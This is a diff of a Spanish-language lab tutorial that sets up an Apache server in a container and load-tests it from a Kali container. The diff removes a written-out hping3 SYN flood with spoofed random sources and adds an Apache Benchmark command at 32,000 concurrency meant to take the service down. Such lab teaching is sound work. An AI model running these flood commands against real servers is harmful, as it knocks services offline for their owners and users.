@@ -34,7 +34,7 @@ apt install -y apache2
 
 ### 📌 5. Configurar el Mensaje de Bienvenida
 ```bash
-echo "Hola, soy un servidor con Apache Server. Si ves este mensaje, el servidor esta activo." > /var/www/html/index.html
+echo "<h3>Hola, soy un servidor con Apache Server.</h3><br>Si ves este mensaje, el servidor esta activo." > /var/www/html/index.html
 ```
 ![Evidencia](img/5.png)
 
@@ -77,7 +77,7 @@ apt update -y && apt upgrade -y
 
 ### 📌 4. Instalar Herramientas de Pruebas de Carga (Apache Benchmark, Hping3, Slowloris)
 ```bash
-apt install -y hping3 slowloris apache2-utils
+apt install -y hping3 apache2-utils
 ```
 ![Evidencia](img/11.png)
 
@@ -87,20 +87,22 @@ apt install -y hping3 slowloris apache2-utils
 
 A continuación, se ejecutará un ataque de inundación TCP aleatoria contra la IP y el puerto 80 del servidor Apache.
 
-### 📌 1. Identificar la IP del Contenedor Ubuntu
-Desde la instancia de Ubuntu, ejecuta:
+### 📌 2. Ejecutar Ataque de DDoS con **Apache Benchmark**
+Este comando simulara 32,000 nodos que realizan 100,000 peticiones al servidor de apache de forma que colapse el servicio. 
 ```bash
-ip a
-```
-![Evidencia](img/12.png)
-
-### 📌 2. Ejecutar Ataque de Inundación TCP con **Hping3**
-```bash
-hping3 -S --flood --rand-source -p 80 172.17.0.2
+ab -n 100000 -c 32000 http://172.17.0.2:80/
 ```
 ![Evidencia](img/13.png)
 
 ---
+
+## 😬 Validación del ataque DDoS
+
+Desde nuestro navegador volvemos a acceder a la pagina del servidor _http://localhost:80_ y notaremos que la carga de la pagina sera muy lenta o simplemente no cargara el sitio hasta que el ataque se detenga. 
+
+Para detener el ataque volvemos a la terminal de nuestro contenedor de kali linux y presionamos Ctrl + C.
+
+![Evidencia](img/8.png)
 
 ## 🎯 Conclusión
 
